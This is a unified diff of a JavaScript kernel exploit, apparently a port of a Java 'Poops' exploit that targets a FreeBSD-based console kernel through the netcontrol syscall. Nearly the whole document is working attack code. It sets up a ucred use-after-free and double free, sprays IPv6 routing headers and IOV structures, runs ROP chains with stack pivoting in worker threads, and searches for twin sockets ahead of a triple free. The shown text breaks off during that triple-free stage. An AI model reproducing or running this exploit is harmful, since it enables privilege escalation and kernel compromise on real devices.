@@ -1,12 +1,10 @@
-include('inject.js')
-
-
-
-
 
 // ============================================================================
 // NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
 // ============================================================================
+
+include('inject.js')
+
 utils.notify('ð\x9F\x92\xA9 NetControl ð\x9F\x92\xA9')
 
 // Socket constants (FreeBSD)
@@ -24,12 +22,12 @@ var UCRED_SIZE = 0x168
 var MSG_HDR_SIZE = 0x30
 var IOV_SIZE = 0x10
 var MSG_IOV_NUM = 0x17
-var IPV6_SOCK_NUM = 64  // Match Java: 64 sockets, not 128
+var IPV6_SOCK_NUM = 128  // Matching Poops.java
 var RTHDR_TAG = 0x13370000
 
-// Retry parameters
-var TWIN_TRIES = 15000
-var UAF_TRIES = 50000
+// Retry parameters (matching Poops.java)
+var TWIN_TRIES = 15000  // Matching Poops.java
+var UAF_TRIES = 50000   // Matching Poops.java
 
 // NetControl constants
 var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
@@ -76,11 +74,25 @@ fn.register(0x76, 'getsockopt', 'bigint')
 fn.register(0x06, 'close_sys', 'bigint')
 fn.register(0x29, 'dup_sys', 'bigint')
 fn.register(0x1B, 'recvmsg', 'bigint')
+
+// Use syscall number 0x63 for netcontrol
+// Note: Java uses dlsym to get __sys_netcontrol wrapper, but fn.register with syscall number
+// should call the libkernel wrapper automatically
+if (!syscalls.map.has(0x63)) {
+  throw new Error('Syscall 0x63 (netcontrol) not found in syscalls.map!')
+}
+var netcontrol_wrapper = syscalls.map.get(0x63)
+log('netcontrol wrapper address: ' + netcontrol_wrapper.toString())
 fn.register(0x63, 'netcontrol_sys', 'bigint')
+log('Registered netcontrol_sys (syscall 0x63)')
+
 fn.register(0x03, 'read_sys', 'bigint')
 fn.register(0x04, 'write_sys', 'bigint')
 fn.register(0x17, 'setuid_sys', 'bigint')
 fn.register(0x14B, 'sched_yield', 'bigint')
+fn.register(0x1B0, 'thr_self', 'bigint')  // FreeBSD uses thr_self, not gettid
+fn.register(0x1E8, 'cpuset_setaffinity', 'bigint')
+fn.register(0x1D2, 'rtprio_thread', 'bigint')
 
 // Create shorthand references
 var socket = fn.socket
@@ -95,6 +107,8 @@ var read_sys = fn.read_sys
 var write_sys = fn.write_sys
 var setuid_sys = fn.setuid_sys
 var sched_yield = fn.sched_yield
+var cpuset_setaffinity = fn.cpuset_setaffinity
+var rtprio_thread = fn.rtprio_thread
 
 // Extract syscall wrapper addresses for ROP chains from syscalls.map
 var read_wrapper = syscalls.map.get(0x03)
@@ -128,8 +142,8 @@ log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')
 for (var i = 0; i < IPV6_SOCK_NUM; i++) {
   var fd = socket(AF_INET6, SOCK_STREAM, 0)
 
-  // Store as number in Int32Array (fn.register returns BigInt)
-  ipv6_sockets[i] = fd.lo()
+  // Store as number in Int32Array (handle both BigInt and plain number)
+  ipv6_sockets[i] = (fd instanceof BigInt) ? fd.lo : fd
   socket_count++
 }
 
@@ -150,10 +164,6 @@ for (var i = 0; i < IPV6_SOCK_NUM; i++) {
 
 log('Initialized ' + IPV6_SOCK_NUM + ' pktopts')
 
-// ============================================================================
-// STAGE 2: Spray routing headers
-// ============================================================================
-
 // Build IPv6 routing header template
 // Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
 var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
@@ -165,21 +175,8 @@ var rthdr_size = (rthdr_len + 1) << 3
 
 log('Built routing header template (size=' + rthdr_size + ' bytes)')
 
-// Spray routing headers with tagged values across all sockets
-log('Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')
-
-for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-  // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
-  mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
-
-  // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
-  setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
-}
-
-log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')
-
 // ============================================================================
-// STAGE 3: Trigger ucred triple-free and find twins/triplet
+// STAGE 2: Trigger ucred triple-free and find twins/triplet
 // ============================================================================
 
 // Allocate buffers
@@ -219,41 +216,57 @@ for (var i = 0; i < MSG_IOV_NUM; i++) {
 
 // Prepare msg_hdr for recvmsg
 var msg_hdr = mem.malloc(MSG_HDR_SIZE)
-mem.view(msg_hdr).setBigInt(0x00, BigInt.Zero, true)  // msg_name
-mem.view(msg_hdr).setUint32(0x08, 0, true)             // msg_namelen
-mem.view(msg_hdr).setBigInt(0x10, msg_iov, true)       // msg_iov
-mem.view(msg_hdr).setUint32(0x18, MSG_IOV_NUM, true)   // msg_iovlen
-mem.view(msg_hdr).setBigInt(0x20, BigInt.Zero, true)   // msg_control
-mem.view(msg_hdr).setUint32(0x28, 0, true)             // msg_controllen
-mem.view(msg_hdr).setUint32(0x2C, 0, true)             // msg_flags
+mem.view(msg_hdr).setBigInt(0x00, BigInt.Zero, true)                 // msg_name
+mem.view(msg_hdr).setUint32(0x08, 0, true)                           // msg_namelen
+mem.view(msg_hdr).setBigInt(0x10, msg_iov, true)                     // msg_iov
+mem.view(msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
+mem.view(msg_hdr).setBigInt(0x20, BigInt.Zero, true)                 // msg_control
+mem.view(msg_hdr).setUint32(0x28, 0, true)                           // msg_controllen
+mem.view(msg_hdr).setUint32(0x2C, 0, true)                           // msg_flags
 
 // Prepare IOV for kernel corruption (iov_base=1 will be interpreted as cr_refcnt)
+// Java only sets the FIRST iovec, rest are zeros
 var corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
-for (var i = 0; i < MSG_IOV_NUM; i++) {
-  mem.view(corrupt_msg_iov).setBigInt(i * IOV_SIZE, new BigInt(0, 1), true)  // iov_base = 1
-  mem.view(corrupt_msg_iov).setBigInt(i * IOV_SIZE + 8, new BigInt(0, 1), true)  // iov_len = 1 (matching Java Int8.SIZE)
-}
+mem.view(corrupt_msg_iov).setBigInt(0, new BigInt(0, 1), true)  // iovec[0].iov_base = 1
+mem.view(corrupt_msg_iov).setBigInt(8, new BigInt(0, 1), true)  // iovec[0].iov_len = 1
+// Rest of iovecs remain zero (default from malloc)
 
 var corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
-mem.view(corrupt_msg_hdr).setBigInt(0x00, BigInt.Zero, true)
-mem.view(corrupt_msg_hdr).setUint32(0x08, 0, true)
-mem.view(corrupt_msg_hdr).setBigInt(0x10, corrupt_msg_iov, true)
-mem.view(corrupt_msg_hdr).setUint32(0x18, MSG_IOV_NUM, true)
-mem.view(corrupt_msg_hdr).setBigInt(0x20, BigInt.Zero, true)
-mem.view(corrupt_msg_hdr).setUint32(0x28, 0, true)
-mem.view(corrupt_msg_hdr).setUint32(0x2C, 0, true)
+mem.view(corrupt_msg_hdr).setBigInt(0x00, BigInt.Zero, true)         // msg_name
+mem.view(corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
+mem.view(corrupt_msg_hdr).setBigInt(0x10, corrupt_msg_iov, true)     // msg_iov
+mem.view(corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
+mem.view(corrupt_msg_hdr).setBigInt(0x20, BigInt.Zero, true)         // msg_control
+mem.view(corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
+mem.view(corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags
 
 log('Prepared IOV spray structures')
 
 // ============================================================================
-// Persistent Worker Pool (4 workers like Java's IOV_THREAD_NUM)
+// Persistent Worker Pool (matching Poops.java)
 // ============================================================================
 
-var IOV_WORKER_NUM = 4
+var IOV_WORKER_NUM = 4  // Matching Poops.java IOV_THREAD_NUM
 var recvmsg_wrapper = syscalls.map.get(0x1B)
 var read_wrapper = syscalls.map.get(0x03)
 var write_wrapper = syscalls.map.get(0x04)
 var thr_exit_wrapper = syscalls.map.get(0x1AF)
+
+// Check if cpuset_setaffinity and rtprio_thread exist in syscalls.map
+if (!syscalls.map.has(0x1E8)) {
+  log('WARNING: Syscall 0x1E8 (cpuset_setaffinity) not in map, workers will not be pinned to CPU')
+  var cpuset_setaffinity_wrapper = null
+} else {
+  var cpuset_setaffinity_wrapper = syscalls.map.get(0x1E8)
+}
+
+if (!syscalls.map.has(0x1D2)) {
+  log('WARNING: Syscall 0x1D2 (rtprio_thread) not in map, workers will not have realtime priority')
+  var rtprio_thread_wrapper = null
+} else {
+  var rtprio_thread_wrapper = syscalls.map.get(0x1D2)
+}
+
 fn.register(0x1C7, 'thr_new', 'bigint')
 var thr_new = fn.thr_new
 
@@ -277,15 +290,83 @@ for (var w = 0; w < IOV_WORKER_NUM; w++) {
   worker.thr_param = mem.malloc(0x80)
   worker.signal_buf = mem.malloc(1)
 
+  // Each worker gets its own corrupt_msg_iov and corrupt_msg_hdr to avoid race conditions
+  worker.corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
+  mem.view(worker.corrupt_msg_iov).setBigInt(0, new BigInt(0, 1), true)  // iovec[0].iov_base = 1
+  mem.view(worker.corrupt_msg_iov).setBigInt(8, new BigInt(0, 1), true)  // iovec[0].iov_len = 1
+  // Rest of iovecs remain zero
+
+  worker.corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
+  mem.view(worker.corrupt_msg_hdr).setBigInt(0x00, BigInt.Zero, true)         // msg_name
+  mem.view(worker.corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
+  mem.view(worker.corrupt_msg_hdr).setBigInt(0x10, worker.corrupt_msg_iov, true)  // msg_iov
+  mem.view(worker.corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen
+  mem.view(worker.corrupt_msg_hdr).setBigInt(0x20, BigInt.Zero, true)         // msg_control
+  mem.view(worker.corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
+  mem.view(worker.corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags
+
+  // CPU affinity structures for this worker (matching Poops.java IovThread)
+  worker.cpumask = mem.malloc(0x10)
+  mem.view(worker.cpumask).setBigInt(0, BigInt.Zero, true)
+  mem.view(worker.cpumask).setBigInt(8, BigInt.Zero, true)
+  mem.view(worker.cpumask).setUint16(0, 1 << 4, true)  // Pin to CPU 4
+
+  // Realtime priority structure for this worker
+  worker.rtp = mem.malloc(4)
+  mem.view(worker.rtp).setUint16(0, 2, true)    // RTP_PRIO_REALTIME
+  mem.view(worker.rtp).setUint16(2, 256, true)  // priority 256
+
+  // Separate ROP stack for infinite looping
+  worker.rop_stack_size = 0x2000  // Larger stack for ROP chain
+  worker.rop_stack = mem.malloc(worker.rop_stack_size)
+  worker.saved_rsp = mem.malloc(8)  // Save initial RSP for pivoting back
+
   workers.push(worker)
 }
 
 log('Created ' + IOV_WORKER_NUM + ' worker slots')
 
-// Build ROP chain for a worker: read → recvmsg → write → read (blocks, keeping IOV alive)
+// Build ROP chain for a worker: infinite loop with stack pivoting
+// Each worker has its own ROP stack that gets restored after each iteration
 function buildWorkerROP(worker) {
   var rop = []
 
+  // Pin to CPU 4: cpuset_setaffinity(3, 1, -1, 0x10, worker.cpumask) - if available
+  if (cpuset_setaffinity_wrapper !== null) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(new BigInt(0, 3))  // CPU_LEVEL_WHICH
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(0, 1))  // CPU_WHICH_TID
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(new BigInt(0xffffffff, 0xffffffff))  // id = -1
+    rop.push(gadgets.POP_RCX_RET)
+    rop.push(new BigInt(0, 0x10))  // setsize
+    rop.push(gadgets.POP_R8_RET)
+    rop.push(worker.cpumask)
+    rop.push(cpuset_setaffinity_wrapper)
+  }
+
+  // Set realtime priority: rtprio_thread(1, 0, worker.rtp) - if available
+  if (rtprio_thread_wrapper !== null) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(new BigInt(0, 1))  // RTP_SET
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(BigInt.Zero)  // lwpid = 0
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(worker.rtp)
+    rop.push(rtprio_thread_wrapper)
+  }
+
+  // Calculate loop start address
+  var rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
+  // Count gadgets above: cpuset (10 if available) + rtprio (7 if available)
+  var setup_gadgets = 0
+  if (cpuset_setaffinity_wrapper !== null) setup_gadgets += 10
+  if (rtprio_thread_wrapper !== null) setup_gadgets += 7
+  var loop_start_offset = setup_gadgets * 8
+  var loop_start_rsp = rop_stack_top.sub(new BigInt(0, loop_start_offset))
+
+  // LOOP START - workers return here after pivoting
   // Wait for work signal: read(ctrl_sock0, buf, 1) - blocks until signaled
   rop.push(gadgets.POP_RDI_RET)
   rop.push(new BigInt(worker.ctrl_sock0))
@@ -295,12 +376,12 @@ function buildWorkerROP(worker) {
   rop.push(new BigInt(0, 1))
   rop.push(read_wrapper)
 
-  // Do work: recvmsg(iov_ss0, corrupt_msg_hdr, 0)
-  // This allocates IOV structures in kernel with iov_base=1
+  // Do work: recvmsg(iov_ss0, worker.corrupt_msg_hdr, 0)
+  // Allocates IOV in kernel, blocks until data arrives
   rop.push(gadgets.POP_RDI_RET)
   rop.push(new BigInt(iov_ss0))
   rop.push(gadgets.POP_RSI_RET)
-  rop.push(corrupt_msg_hdr)
+  rop.push(worker.corrupt_msg_hdr)
   rop.push(gadgets.POP_RDX_RET)
   rop.push(BigInt.Zero)
   rop.push(recvmsg_wrapper)
@@ -314,25 +395,14 @@ function buildWorkerROP(worker) {
   rop.push(new BigInt(0, 1))
   rop.push(write_wrapper)
 
-  // IMPORTANT: Block again to keep thread (and IOV) alive!
-  // This prevents the kernel from freeing the IOV structures
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(worker.ctrl_sock0))
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(worker.signal_buf)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(0, 1))
-  rop.push(read_wrapper)
-
-  // Exit thread (only reached when explicitly signaled to exit)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(BigInt.Zero)
-  rop.push(thr_exit_wrapper)
+  // Pivot RSP back to loop start and continue
+  rop.push(gadgets.POP_RSP_RET)
+  rop.push(loop_start_rsp)  // RSP = loop start, next RET goes to read()
 
   return rop
 }
 
-// Spawn a worker thread
+// Spawn a worker thread (only called once - workers loop via stack pivoting)
 function spawnWorker(worker_idx) {
   var worker = workers[worker_idx]
 
@@ -340,16 +410,22 @@ function spawnWorker(worker_idx) {
   mem.view(worker.child_tid).setBigInt(0, BigInt.Zero, true)
   mem.view(worker.parent_tid).setBigInt(0, BigInt.Zero, true)
 
-  // Build and write ROP chain to stack
+  // Build and write ROP chain to dedicated ROP stack
   var rop = buildWorkerROP(worker)
-  var stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
+  var rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
   for (var i = rop.length - 1; i >= 0; i--) {
-    stack_top = stack_top.sub(new BigInt(0, 8))
-    mem.view(stack_top).setBigInt(0, rop[i], true)
+    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
+    mem.view(rop_stack_top).setBigInt(0, rop[i], true)
   }
 
+  // Write pivot target to thread's initial stack
+  // Thread starts with RSP = stack + stack_size, so write at top of stack
+  var initial_stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
+  var pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
+  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)  // Value for POP_RSP_RET
+
   // Setup thr_param
-  mem.view(worker.thr_param).setBigInt(0x00, gadgets.RET, true)
+  mem.view(worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)  // Entry: pop RSP (pivots to ROP stack)
   mem.view(worker.thr_param).setBigInt(0x08, BigInt.Zero, true)
   mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
   mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
@@ -361,56 +437,100 @@ function spawnWorker(worker_idx) {
   return thr_new(worker.thr_param, new BigInt(0, 0x68))
 }
 
-// Spawn all workers (they will block waiting for signals)
-log('Spawning ' + IOV_WORKER_NUM + ' persistent workers...')
+// Spawn all workers ONCE - they loop infinitely via stack pivoting
+log('Spawning ' + IOV_WORKER_NUM + ' looping workers (stack pivoting)...')
 for (var w = 0; w < IOV_WORKER_NUM; w++) {
   var ret = spawnWorker(w)
   if (!ret.eq(0)) {
     throw new Error('Failed to spawn worker ' + w + ': ' + ret.toString())
   }
 }
-log('All workers spawned and waiting')
+log('All workers spawned - they will loop infinitely without respawn!')
 
-// Global counter for round-robin worker selection
-var iov_spray_count = 0
+// Pin main thread to CPU core 4 and set real-time priority
+log('Pinning main thread to CPU 4 with real-time priority...')
 
-// IOV spray using persistent workers (they stay alive with IOV allocated)
+// Pin to CPU 4
+var CPU_LEVEL_WHICH = 3  // CPU_LEVEL_WHICH
+var CPU_WHICH_TID = 1    // CPU_WHICH_TID
+var MAIN_CORE = 4        // CPU core 4
+var CPU_SET_SIZE = 0x10  // 16 bytes
+var main_cpumask = mem.malloc(CPU_SET_SIZE)
+// Zero out the buffer
+mem.view(main_cpumask).setBigInt(0, BigInt.Zero, true)
+mem.view(main_cpumask).setBigInt(8, BigInt.Zero, true)
+// Set bit for CPU 4 using 16-bit short (matching Java putShort)
+mem.view(main_cpumask).setUint16(0, 1 << MAIN_CORE, true)
+
+cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, new BigInt(0xffffffff, 0xffffffff), CPU_SET_SIZE, main_cpumask)
+
+// Set real-time priority
+var RTP_SET = 1
+var RTP_PRIO_REALTIME = 2
+var main_rtp = mem.malloc(4)
+mem.view(main_rtp).setUint16(0, RTP_PRIO_REALTIME, true)  // offset 0x00: type = 2
+mem.view(main_rtp).setUint16(2, 256, true)                 // offset 0x02: prio = 256
+rtprio_thread(RTP_SET, 0, main_rtp)  
+
+log('Main thread pinned to CPU 4 and set to real-time priority')
+
+// IOV spray using single worker (matching Poops.java for precise stages)
+// Worker 0 only - used for double-free and triple-free setup
+function doIOVSpraySingle() {
+  // Signal worker 0 to start (matching Java: iovState.signalWork(0))
+  write_sys(new BigInt(workers[0].ctrl_sock1), workers[0].signal_buf, new BigInt(0, 1))
+  sched_yield()
+
+  // Write ONE byte to iov_ss1 - wakes worker 0
+  write_sys(new BigInt(iov_ss1), workers[0].signal_buf, new BigInt(0, 1))
+
+  // Wait for worker 0 to signal completion (matching Java: iovState.waitForFinished())
+  var done = read_sys(new BigInt(workers[0].ctrl_sock0), workers[0].signal_buf, new BigInt(0, 1))
+  var done_val = (done instanceof BigInt) ? done.lo : done
+  if (done_val !== 1) {
+    throw new Error('Worker 0 did not signal completion! read returned: ' + done_val)
+  }
+
+  // Read ONE byte back from iov_ss0 (matching Java: read(iovSs0, tmp, Int8.SIZE))
+  var consumed = read_sys(new BigInt(iov_ss0), workers[0].signal_buf, new BigInt(0, 1))
+  var consumed_val = (consumed instanceof BigInt) ? consumed.lo : consumed
+  if (consumed_val !== 1) {
+    throw new Error('Failed to read byte from iov_ss0! read returned: ' + consumed_val)
+  }
+
+  // Worker auto-loops via stack pivoting - no respawn needed
+}
+
+// IOV spray using all workers (for better coverage when needed)
 function doIOVSpray() {
-  // Use round-robin to track which iteration we're on
-  var iteration = iov_spray_count
-  iov_spray_count++
-
-  // Signal ALL workers to start work
-  // Workers that completed previous sprays are blocked waiting for this signal
-  // Workers that are still in recvmsg from previous sprays will stay blocked there
+  // Signal all workers to start
   for (var w = 0; w < IOV_WORKER_NUM; w++) {
     write_sys(new BigInt(workers[w].ctrl_sock1), workers[w].signal_buf, new BigInt(0, 1))
   }
 
-  // Yield to let workers enter recvmsg
+  // Yield to let workers enter recvmsg (IOV allocated here!)
   sched_yield()
 
-  // Write 1 byte to iov socket - ONE thread reads it and completes recvmsg
-  // That thread's IOV structures stay allocated (thread blocks in final read)
+  // Write ONE byte to iov_ss1 - wakes ALL workers since they're all blocking on iov_ss0
   write_sys(new BigInt(iov_ss1), workers[0].signal_buf, new BigInt(0, 1))
 
-  // Wait for ONE worker to signal completion (we don't know which one)
-  // Check all workers' control sockets
-  var completed = false
+  // Wait for all workers to signal completion
   for (var w = 0; w < IOV_WORKER_NUM; w++) {
-    // Non-blocking check by reading with sched_yield between attempts
-    var bytes = read_sys(new BigInt(workers[w].ctrl_sock0), workers[w].signal_buf, new BigInt(0, 1))
-    if (bytes.lo() === 1) {
-      completed = true
-      break
+    var done = read_sys(new BigInt(workers[w].ctrl_sock0), workers[w].signal_buf, new BigInt(0, 1))
+    var done_val = (done instanceof BigInt) ? done.lo : done
+    if (done_val !== 1) {
+      throw new Error('Worker ' + w + ' did not signal completion! read returned: ' + done_val)
     }
   }
 
-  // Read back from iov socket to cleanup
-  read_sys(new BigInt(iov_ss0), workers[0].signal_buf, new BigInt(0, 1))
+  // Read ONE byte back from iov_ss0
+  var consumed = read_sys(new BigInt(iov_ss0), workers[0].signal_buf, new BigInt(0, 1))
+  var consumed_val = (consumed instanceof BigInt) ? consumed.lo : consumed
+  if (consumed_val !== 1) {
+    throw new Error('Failed to read byte from iov_ss0! read returned: ' + consumed_val)
+  }
 
-  // Workers stay alive! Don't respawn - they're blocked in their final read()
-  // This keeps the IOV structures allocated in kernel memory
+  // Workers automatically pivot RSP back and loop - no respawn needed!
 }
 
 // ============================================================================
@@ -418,14 +538,15 @@ function doIOVSpray() {
 // ============================================================================
 
 // Create dummy socket to register and close
-var dummy_sock = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
+var dummy_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
+var dummy_sock = ((dummy_sock_result instanceof BigInt) ? dummy_sock_result.lo : dummy_sock_result) & 0xFFFFFFFF
 log('Created dummy socket: ' + dummy_sock)
 
 // Register dummy socket with netcontrol
-var set_buf = mem.malloc(8)
+set_buf = mem.malloc(8)
 mem.view(set_buf).setUint32(0, dummy_sock, true)
-netcontrol_sys(-1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8)
-log('Registered dummy socket')
+var set_ret = netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE), set_buf, new BigInt(0, 8))
+log('netcontrol SET_QUEUE returned: ' + ((set_ret instanceof BigInt) ? set_ret.toString() : set_ret))
 
 // Close dummy socket
 close_sys(dummy_sock)
@@ -435,57 +556,79 @@ log('Closed dummy socket')
 setuid_sys(1)
 
 // Reclaim the file descriptor
-uaf_sock = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
+var uaf_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
+uaf_sock = ((uaf_sock_result instanceof BigInt) ? uaf_sock_result.lo : uaf_sock_result) & 0xFFFFFFFF
 log('Created uaf_sock: ' + uaf_sock)
 
 // Free the previous ucred (now uaf_sock's f_cred has cr_refcnt=1)
 setuid_sys(1)
 
 // Unregister and free the file and ucred
-var clear_buf = mem.malloc(8)
+clear_buf = mem.malloc(8)
 mem.view(clear_buf).setUint32(0, uaf_sock, true)
-netcontrol_sys(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8)
-log('Unregistered uaf_sock')
+var clear_ret = netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE), clear_buf, new BigInt(0, 8))
+log('netcontrol CLEAR_QUEUE returned: ' + ((clear_ret instanceof BigInt) ? clear_ret.toString() : clear_ret))
 
-// Set cr_refcnt back to 1 with IOV spray (32 iterations matching Java)
-log('Resetting cr_refcnt with IOV spray (32 iterations)...')
+// Set cr_refcnt back to 1 with IOV spray (32 iterations matching Poops.java lines 823-829)
+log('Resetting cr_refcnt with IOV spray (32 iterations, worker 0 only)...')
 for (var reset_i = 0; reset_i < 32; reset_i++) {
-  doIOVSpray()
+  doIOVSpraySingle()  // Match Java: only worker 0
 }
-log('cr_refcnt reset complete (32 IOV sprays done)')
-
-// Give threads time to fully exit and kernel to reclaim memory
-log('Waiting for workers to settle...')
-for (var thread_cleanup = 0; thread_cleanup < 100; thread_cleanup++) { sched_yield() }
-gc()
-log('Worker pool ready')
 
 // Double free ucred (only dup works - doesn't check f_hold)
+// Matching Java: no wait between IOV spray and double-free
 var dup_fd = dup_sys(uaf_sock)
-close_sys(dup_fd)
-log('Double freed ucred via close(dup(uaf_sock))')
+var dup_fd_num = (dup_fd instanceof BigInt) ? dup_fd.lo : dup_fd
+log('dup_sys returned: ' + dup_fd_num + ' (should be >= 0)')
+if (dup_fd_num < 0) {
+  throw new Error('dup_sys failed with: ' + dup_fd_num)
+}
+close_sys(dup_fd_num)
+log('Double freed ucred via close(dup(' + uaf_sock + ')) where dup_fd=' + dup_fd_num)
 
-// Find twins - two sockets sharing same routing header (matching Java findTwins)
+
+// Find twin sockets (two sockets sharing the same kernel rthdr)
 log('Finding twins...')
-var found_twins = false
-var twin_attempts = 0
 
-while (!found_twins) {
-  // Spray tags across all sockets (matching Java findTwins)
+var found_twins = false
+
+// Set leak_len_buf once outside loop to reduce memory allocations
+mem.view(leak_len_buf).setUint32(0, 8, true)
+
+// Reuse single view to avoid creating new DataViews
+var rthdr_view = mem.view(rthdr_buf)
+var leak_view = mem.view(leak_rthdr_buf)
+
+for (var twin_attempts = 0; twin_attempts < TWIN_TRIES; twin_attempts++) {
+  // Yield every 10 attempts to prevent memory buildup
+  if (twin_attempts > 0 && twin_attempts % 10 === 0) {
+    sched_yield()
+  }
+
+  // Progress logging every 100 attempts
+  if (twin_attempts > 0 && twin_attempts % 100 === 0) {
+    log('  Twin search progress: ' + twin_attempts + '/' + TWIN_TRIES + ' attempts...')
+
+    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory) {
+      log('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc)
+    }
+  }
+
+  // Combined spray and check loop to reduce iterations and memory
   for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-    mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
+    // Spray tag to this socket
+    rthdr_view.setUint32(4, RTHDR_TAG | i, true)
     setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
   }
 
-  // Check for twins
+  // Check all sockets for twins
   for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-    mem.view(leak_len_buf).setBigInt(0, new BigInt(0, 8), true)  // Read only 8 bytes
     getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
-    var val = mem.view(leak_rthdr_buf).getUint32(4, true)
+    var val = leak_view.getUint32(4, true)
     var j = val & 0xFFFF
 
-    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
+    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j < IPV6_SOCK_NUM) {
       twins[0] = i
       twins[1] = j
       found_twins = true
@@ -494,14 +637,17 @@ while (!found_twins) {
     }
   }
 
-  twin_attempts++
-  if (twin_attempts % 100 === 0) {
-    log('Twin search attempt ' + twin_attempts + '...')
-  }
-  if (twin_attempts > 1000) {
-    throw new Error('Failed to find twins after 1000 spray attempts - double-free may not be working')
-  }
+  if (found_twins) break
 }
+
+if (!found_twins) {
+  throw new Error('Failed to find twins after ' + TWIN_TRIES + ' attempts')
+}
+
+log('=== SUCCESS: Twins found! Stopping here for testing ===')
+log('Twin sockets: [' + twins[0] + ', ' + twins[1] + ']')
+utils.notify('NetControl: Twins found!')
+throw new Error('STOP: Twins found - halting before triple-free')
 
 // ============================================================================
 // Triple-free setup
@@ -512,40 +658,32 @@ log('=== Triple-freeing ucred ===')
 setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
 log('Freed rthdr on socket[' + twins[1] + ']')
 
-// Set cr_refcnt back to 1 by spraying IOV until first_int == 1 (matching Java)
+// Set cr_refcnt back to 1 by spraying IOV until first_int == 1 (matching Java lines 837-853)
 log('Spraying IOV to reset cr_refcnt for triple-free...')
-var triplet_spray_attempts = 0
-var max_triplet_spray = 5000
-var spray_batch_size = 10  // Spray 10 times before checking
+var uaf_timeout = UAF_TRIES
+while (uaf_timeout-- > 0) {
+  // Signal worker 0 to start (matching Java: iovState.signalWork(0))
+  write_sys(new BigInt(workers[0].ctrl_sock1), workers[0].signal_buf, new BigInt(0, 1))
+  sched_yield()
 
-while (triplet_spray_attempts < max_triplet_spray) {
-  // Batch spray using persistent workers
-  for (var batch_i = 0; batch_i < spray_batch_size; batch_i++) {
-    doIOVSpray()
-    triplet_spray_attempts++
-  }
-
-  // Give workers time to settle before checking
-  for (var cleanup_delay = 0; cleanup_delay < 50; cleanup_delay++) { sched_yield() }
-  gc()
-
-  // Check if reclaim succeeded (after batch)
-  mem.view(leak_len_buf).setBigInt(0, new BigInt(0, 8), true)
+  // Check if reclaim succeeded (matching Java: leakRthdr.getInt(0x00) == 1)
+  mem.view(leak_len_buf).setUint32(0, 8, true)
